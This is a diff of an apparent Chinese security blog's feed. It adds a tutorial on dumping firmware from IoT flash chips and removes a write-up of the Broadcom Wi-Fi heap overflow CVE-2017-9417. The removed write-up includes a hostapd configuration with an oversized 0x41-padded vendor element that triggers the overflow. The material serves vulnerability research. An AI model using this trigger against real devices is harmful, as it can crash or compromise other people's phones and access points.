-<p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image38.jpg" alt="img"></p>
-<p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image39.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image40.jpg" alt="img"></p>
-<h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image41.jpg" alt="img"></p>
-<p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image118.jpg" alt="img"></p>
-<p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image42.jpg" alt="img"></p>
-<p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image43.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image44.jpg" alt="img"></p>
-<p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image45.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image46.jpg" alt="img"></p>
-<p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image116.jpg" alt="img"></p>
-<h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image47.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image48.jpg" alt="img"></p>
-<p>通过显微镜发现芯片型号为25L128。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image120.jpg" alt="img"></p>
-<p>连接编程器读取固件并保存。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image49.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image50.jpg" alt="img"></p>
-<h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image52.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image119.jpg" alt="img"></p>
-<p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image51.jpg" alt="img"></p>
-<p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image54.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image53.jpg" alt="img"></p>
-<p>在编程器中选择该型号，成功提取出固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image55.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image56.jpg" alt="img"></p>
-<p>用binwalk解包固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image115.jpg" alt="img"></p>
-<h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image57.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image58.jpg" alt="img"></p>
-<p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image59.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image60.jpg" alt="img"></p>
-<h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image62.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image121.jpg" alt="img"></p>
-<p>通过夹具连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image61.jpg" alt="img"></p>
-<p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image63.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image64.jpg" alt="img"></p>
-<p>用binwalk解包固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image117.jpg" alt="img"></p>
-<h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>对于某些机器，芯片引脚采用点锡丝网焊接在背面，引脚太小或没有暴露出引脚，就需要通过拆焊芯片来读取固件了。<br>通过热风枪和锡焊配合，很容易从PCB上把芯片拆焊出来，但在拆焊过程中，可能存在芯片因为过热被损坏，PCB上其他元器件被损坏，电路无法接通等风险，需要酌情考虑。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image92.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image93.jpg" alt="img"></p>
-<h3 id="热风枪和锡焊拆焊芯片读取固件"><a href="#热风枪和锡焊拆焊芯片读取固件" class="headerlink" title="热风枪和锡焊拆焊芯片读取固件"></a>热风枪和锡焊拆焊芯片读取固件</h3><p>设置热风枪温度为400度，拆焊掉的芯片，通过转接座与编程器连接，同样需要注意芯片的引脚方向。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image94.jpg" alt="img"></p>
-<p>读取芯片固件并导出。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image95.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image46.jpg" alt="img"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;/p&gt;
-&lt;h2 id=&quot;编程器读取&quot;&gt;
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -1163,6 +1288,59 @@ H2 = 0
   </entry>
   
   <entry>
+    <title>物联网硬件安全分析基础-固件提取</title>
+    <link href="http://www.future-sec.com/iot-security-hardware-obtain.html"/>
+    <id>http://www.future-sec.com/iot-security-hardware-obtain.html</id>
+    <published>2017-11-26T16:00:00.000Z</published>
+    <updated>2018-06-29T09:01:10.629Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。</p>
+<h2 id="编程器读取"><a href="#编程器读取" class="headerlink" title="编程器读取"></a>编程器读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image36.jpg" alt="img"></p>
+<h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image37.jpg" alt="img"></p>
+<p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image38.jpg" alt="img"></p>
+<p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image39.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image40.jpg" alt="img"></p>
+<h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image41.jpg" alt="img"></p>
+<p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image118.jpg" alt="img"></p>
+<p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image42.jpg" alt="img"></p>
+<p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image43.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image44.jpg" alt="img"></p>
+<p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image45.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image46.jpg" alt="img"></p>
+<p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image116.jpg" alt="img"></p>
+<h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image47.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image48.jpg" alt="img"></p>
+<p>通过显微镜发现芯片型号为25L128。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image120.jpg" alt="img"></p>
+<p>连接编程器读取固件并保存。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image49.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image50.jpg" alt="img"></p>
+<h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image52.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image119.jpg" alt="img"></p>
+<p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image51.jpg" alt="img"></p>
+<p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image54.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image53.jpg" alt="img"></p>
+<p>在编程器中选择该型号，成功提取出固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image55.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image56.jpg" alt="img"></p>
+<p>用binwalk解包固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image115.jpg" alt="img"></p>
+<h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image57.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image58.jpg" alt="img"></p>
+<p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image59.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image60.jpg" alt="img"></p>
+<h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image62.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image121.jpg" alt="img"></p>
+<p>通过夹具连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image61.jpg" alt="img"></p>
+<p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image63.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image64.jpg" alt="img"></p>
+<p>用binwalk解包固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image117.jpg" alt="img"></p>
+<h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>对于某些机器，芯片引脚采用点锡丝网焊接在背面，引脚太小或没有暴露出引脚，就需要通过拆焊芯片来读取固件了。<br>通过热风枪和锡焊配合，很容易从PCB上把芯片拆焊出来，但在拆焊过程中，可能存在芯片因为过热被损坏，PCB上其他元器件被损坏，电路无法接通等风险，需要酌情考虑。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image92.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image93.jpg" alt="img"></p>
+<h3 id="热风枪和锡焊拆焊芯片读取固件"><a href="#热风枪和锡焊拆焊芯片读取固件" class="headerlink" title="热风枪和锡焊拆焊芯片读取固件"></a>热风枪和锡焊拆焊芯片读取固件</h3><p>设置热风枪温度为400度，拆焊掉的芯片，通过转接座与编程器连接，同样需要注意芯片的引脚方向。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image94.jpg" alt="img"></p>
+<p>读取芯片固件并导出。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image95.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image46.jpg" alt="img"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;/p&gt;
+&lt;h2 id=&quot;编程器读取&quot;&gt;
+    
+    </summary>
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
     <title>记一次曲折的内网渗透</title>
     <link href="http://www.future-sec.com/network-penetration.html"/>
     <id>http://www.future-sec.com/network-penetration.html</id>
@@ -1275,101 +1453,6 @@ H2 = 0
       <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
     
       <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BROADCOM WI-FI芯片漏洞分析二</title>
-    <link href="http://www.future-sec.com/broadcom-wifi-2.html"/>
-    <id>http://www.future-sec.com/broadcom-wifi-2.html</id>
-    <published>2017-08-29T16:00:00.000Z</published>
-    <updated>2017-12-21T07:33:35.154Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。<br>1、首先是定位到帧提取函数<br>2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。<br>3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">uint8_t* buffer = malloc(<span class="number">256</span>);</div><div class="line">uint8_t* pos = buffer;</div><div class="line"><span class="comment">//Copying the initial (static) information</span></div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., <span class="number">101</span>);</div><div class="line">memcpy(pos, linkid_ie + <span class="number">0x8</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;   <span class="comment">//Initiator MAC</span></div><div class="line">memcpy(pos, linkid_ie + <span class="number">0xE</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;    <span class="comment">//Responder MAC</span></div><div class="line">*pos = transaction_seq;             pos++;                   <span class="comment">//TransactionSeq</span></div><div class="line">memcpy(pos, linkid_ie, <span class="number">0x14</span>);       pos += <span class="number">0x14</span>;             <span class="comment">//LinkID-IE</span></div><div class="line"><span class="comment">//Copying the RSN IE</span></div><div class="line">uint8_t* rsn_ie = bcm_parse_tlvs(..., <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (rsn_ie[<span class="number">1</span>] + <span class="number">2</span> + (pos - buffer) &gt; <span class="number">0xFF</span>) &#123;</div><div class="line">    ... <span class="comment">//Handle overflow</span></div><div class="line">&#125;</div><div class="line">memcpy(pos, rsn_ie, rsn_ie[<span class="number">1</span>] + <span class="number">2</span>); pos += rsn_ie[<span class="number">1</span>] + <span class="number">2</span>;    <span class="comment">//RSN-IE</span></div><div class="line"><span class="comment">//Copying the remaining IEs</span></div><div class="line">uint8_t* timeout_ie = bcm_parse_tlvs(..., <span class="number">56</span>);</div><div class="line">uint8_t* ft_ie      = bcm_parse_tlvs(..., <span class="number">55</span>);</div><div class="line">memcpy(pos, timeout_ie, <span class="number">0x7</span>);       pos += <span class="number">0x7</span>;              <span class="comment">//Timeout Interval IE</span></div><div class="line">memcpy(pos, ft_ie, <span class="number">0x54</span>);           pos += <span class="number">0x54</span>;             <span class="comment">//Fast-Transition IE</span></div></pre></td></tr></table></figure></p>
-<p>到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。</p>
-<h2 id="切入主题"><a href="#切入主题" class="headerlink" title="切入主题"></a>切入主题</h2><p>1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。<br>2、涉及到的相关知识将以链接形式详细给出</p>
-<h2 id="CVE-2017-9417漏洞分析"><a href="#CVE-2017-9417漏洞分析" class="headerlink" title="CVE-2017-9417漏洞分析"></a>CVE-2017-9417漏洞分析</h2><h3 id="分析ROM固件找到漏洞"><a href="#分析ROM固件找到漏洞" class="headerlink" title="分析ROM固件找到漏洞"></a>分析ROM固件找到漏洞</h3><p>1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：<br>type (1 byte), length (1 byte), data of (length) bytes<br>2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：<br><img src="/images/wifi6.png" alt="img"><br>3、定位漏洞函数<br>·    bindiff对比6月份补丁跟7月份补丁的差异<br>·    第一步：将两个补丁版本都dump下来。<br>·    第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff<br>·    第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：<br><img src="/images/wifi7.png" alt="img"><br><img src="/images/wifi8.png" alt="img"><br>·    第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。<br>    跟踪到造成漏洞的函数。<br> <img src="/images/wifi9.png" alt="img"><br><img src="/images/wifi10.png" alt="img">   </p>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。<br>assocresp_ies数据<br><img src="/images/wifi11.png" alt="img"><br>分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。<br><img src="/images/wifi12.png" alt="img"><br>如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。<br><img src="/images/wifi13.png" alt="img"><br>缓冲区分配ida中参考在<a href="http://note.youdao.com/noteshare?id=7cb193be6f06643ef49f5f780bdb78c9" rel="external nofollow noopener noreferrer" target="_blank">这里</a></p>
-<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。<br>hostapd 安装：链接</p>
-<ol>
-<li>下载hostapd到ubuntu 14.04</li>
-<li>解压hostapd</li>
-<li>配置hostapd，使它编译为支持nl80211驱动<br>cp defconfig .config<br>vi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。</li>
-<li>make #编译hostapd ，编译过程会报错，是因为缺少libnl库<br><img src="/images/wifi14.png" alt="img"><br>解决方法：下载并编译安装libnl 可以到主页下载：<a href="http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：" rel="external nofollow noopener noreferrer" target="_blank">http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：</a><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/tgraf/libnl-1.1-stable.git</span></div><div class="line">cd libnl<span class="number">-1.1</span>-stable</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>5、make编译<br><img src="/images/wifi15.png" alt="img"><br>在启动hostapd时指定配置文件<br>1、新建配置文件 在/etc/目录新建一个文件hostapd.conf<br>2、配置文件内容<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># WiFi Hotspot</div><div class="line">interface=wlan0</div><div class="line">driver=nl80211</div><div class="line">#Access Point</div><div class="line">ssid=YourNetworkNameHere</div><div class="line">hw_mode=g</div><div class="line"># WiFi Channel:</div><div class="line">channel=1</div><div class="line">macaddr_acl=0</div><div class="line">auth_algs=1</div><div class="line">ignore_broadcast_ssid=0</div><div class="line"></div><div class="line">assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div><div class="line">vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div></pre></td></tr></table></figure></p>
-<p>1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；<br>2.driver：设定无线驱动，我这里是nl80211；<br>3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.<br>4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b<br>5.channel:设置hostapd操作的channel.<br>6.ignore_broadcast_ssid: 开启或禁用广播ssid.<br>7.macaddr_acl: MAC地址过滤. .<br>8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）<br>3、启动 hostpad<br>1.启动<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
